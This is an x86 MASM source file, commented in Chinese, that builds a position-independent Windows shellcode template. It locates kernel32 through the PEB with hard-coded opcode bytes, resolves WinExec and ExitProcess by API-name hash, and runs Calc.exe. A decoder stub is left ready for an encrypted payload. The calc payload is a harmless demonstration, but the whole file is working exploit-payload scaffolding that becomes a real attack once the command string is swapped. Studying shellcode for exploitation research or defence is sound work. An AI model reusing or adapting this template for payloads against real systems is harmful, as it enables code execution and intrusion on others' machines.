include ShellCodeCalc.inc

;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
; 代码段
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
		.code
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
;                     API Hash值
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
;MessageBoxA     1E380A6Ah
;LoadLibraryA    0C917432h
;ExitProcess     4FD18963h
;WinExec         1A22F51h
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
;                ShellCode 模型介绍
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
;........................................................
;解码ShellCode    长度未知 
;JMP -> ShellCode
;........................................................
;GetKernelBase    长度已知 
;........................................................
;GetPorcAddress   长度已知 
;........................................................
;String           长度未知
;........................................................
; 可以变长的ShellCode
;    抬高栈顶, 获取函数指针
;    完成ShellCode功能
;........................................................
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
;                 ShellCode 宏定义部分
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
DECODE_LEN       equ DeCodeEnd - DeCodeBegin                      ;解密代码的长度
ENCODE_LEN       equ ShellCodeEnd - MyGetKernelBegin              ;加密代码的长度
KERNEL_BASE_LEN  equ MyGetKernelEnd - MyGetKernelBegin            ;MyGetKernelBase代码长度
PROCADDR_LEN     equ MyGetProcAddressEnd - MyGetProcAddressBegin  ;GetProcAddress代码长度
SHELLCODE_LEN    equ ShellCodeEnd - ShellCodeBegin                ;ShellCode代码长度
STRING_LEN       equ STRING_END - STRING_BEGIN                    ;字符串长度

dwGetKernelBase  =   DECODE_LEN - 5                               ;GetKernelBase  Offset
dwGetProcAddress =   DECODE_LEN + KERNEL_BASE_LEN - 5             ;GetProcAddress Offset


STACK_LEN        equ 100  ;抬高栈顶的大小


dwKernelBase     =   0h              ;KernelBase偏移
fnWinExec        =   4h              ;fnWinExec偏移
hUser32          =   8h              ;hUser32偏移
fnMessageBox     =   0Ch             ;MessageBox偏移
fnExitProcess    =   10h             ;ExitProcess偏移
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
;                     解码部分
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
DeCodeBegin:
  ;重定位
  call GET_EIP_1 
GET_EIP_1: 
  pop ebx
  
  ;解密代码[不能使用ebx寄存器]
  ;......
  
  ;跳转到ShellCode开始
  jmp ShellCodeBegin
DeCodeEnd:
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
;                     MyGetKernelBase
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
MyGetKernelBegin:
g_fn_GetKernelBase  db 064h,0A1h,18h,00h,00h,00h,8Bh,40h,30h,8Bh,40h,0Ch,8Bh,40h,0Ch,8Bh,00h,8Bh,00h,8Bh,40h,18h,0C3h
MyGetKernelEnd:
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
;                     MyGetProcAddress
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
MyGetProcAddressBegin:
g_fn_GetProcAddress db   55h,8Bh,0ECh,56h,53h,51h,83h,7Dh,08h,00h,74h,6Bh,8Bh,75h
                    db   08h,03h,76h,3Ch,8Dh,76h,78h,8Bh,36h,03h,75h,08h,8Bh,5Eh
                    db   20h,03h,5Dh,08h,33h,0C9h,8Bh,04h,8Bh,03h,45h,08h,51h,8Bh
                    db   0D0h,33h,0C0h,8Ah,0Ah,84h,0C9h,74h,11h,0Fh,0BEh,0C9h,0C1h
                    db   0C8h,07h,83h,0C2h,01h,03h,0C1h,8Ah,0Ah,84h,0C9h,75h,0EFh
                    db   59h,3Bh,45h,0Ch,74h,06h,41h,3Bh,4Eh,18h,72h,0D2h,3Bh,4Eh,18h
                    db   73h,22h,8Bh,5Eh,24h,03h,5Dh,08h,0Fh,0B7h,04h,4Bh,3Bh,46h
                    db   14h,73h,13h,8Bh,5Eh,1Ch,03h,5Dh,08h,8Bh,04h,83h,03h,45h
                    db   08h,59h,5Bh,5Eh,0C9h,0C2h,08h,00h,33h,0C0h,59h,5Bh,5Eh
                    db   0C9h,0C2h,08h,00h
MyGetProcAddressEnd:
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
;                     String
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
STRING_BEGIN:
lpCmd db 'Calc.exe',0

CMD_LEN   = STRING_END - lpCmd
lpszCmd   =   dwGetProcAddress +  PROCADDR_LEN             ;lpszUser32
STRING_END:
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
;                     ShellCode 
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
ShellCodeBegin:
  ;扩充栈空间 保存栈环境
  sub  esp,STACK_LEN
  push ebp
  mov  ebp,esp
  
  ;得到Kernel32.dll的基地址
  lea eax,[ebx + dwGetKernelBase]
  call eax
  or eax,eax
  jz Exit_ShellCode
  mov dword ptr [ebp + dwKernelBase],eax
  
  ;遍历导出表 得到WinExec地址
  push 1A22F51h
  push dword ptr [ebp + dwKernelBase]
  lea  eax,[ebx + dwGetProcAddress]
  call eax
  or   eax,eax
  jz   Exit_ShellCode
  mov dword ptr [ebp + fnWinExec],eax
  
  ;弹出计算器
  push SW_SHOWNORMAL
  lea  eax,[ebx + lpszCmd]
  push eax
  call dword ptr [ebp + fnWinExec]
  
Exit_ShellCode:
  ;获取ExitProcess函数地址
  push 4FD18963h
  push dword ptr [ebp + dwKernelBase]
  lea  eax,[ebx + dwGetProcAddress]
  call eax
  or   eax,eax
  jz   ShellCodeEnd
  mov dword ptr [ebp + fnExitProcess],eax
  
  ;调用ExitProcess
  push NULL
  call dword ptr [ebp + fnExitProcess]

ShellCodeEnd:
nop
nop
nop
nop
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
;                        End 
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>



ShowLen proc
  
  invoke crt_printf,L("Decode Len:",9h,"%d",0ah,0dh),DECODE_LEN
  invoke crt_printf,L("Encode Len:",9h,"%d",0ah,0dh),ENCODE_LEN
  invoke crt_printf,L("GetKernelBase Len:",9h,"%d",0ah,0dh),KERNEL_BASE_LEN
  invoke crt_printf,L("GetProcAddress Len:",9h,"%d",0ah,0dh),PROCADDR_LEN
  invoke crt_printf,L("ShellCode Len:",9h,"%d",0ah,0dh),SHELLCODE_LEN
  
  ret

ShowLen endp



main proc
  
  
  ;invoke ShowLen
  jmp DeCodeBegin

main endp

end main